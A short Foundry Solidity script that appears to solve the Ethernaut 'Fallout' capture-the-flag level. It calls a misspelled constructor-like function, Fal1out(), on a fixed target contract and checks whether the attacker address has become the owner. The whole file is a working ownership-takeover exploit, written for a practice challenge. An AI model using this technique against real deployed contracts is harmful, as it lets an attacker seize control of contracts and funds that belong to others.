// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Script} from "lib-src/Script.sol";
import {console} from "lib-src/console.sol";

import {IFallout} from "src/interfaces/IFallout.sol";

// forge script script/2_Fallout.s.sol -vvv
contract FalloutSolution is Script {

    IFallout public target = IFallout(payable(0x850617A58b534c04201c5D737F356fA4C6e7E3E4));
    address public attacker = 0x5F49CfE21B12ffD7fE0dDd11E91b2636F86D7358;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        target.Fal1out();
        console.log("Attack success:", attacker == target.owner());

        vm.stopBroadcast();
    }
}
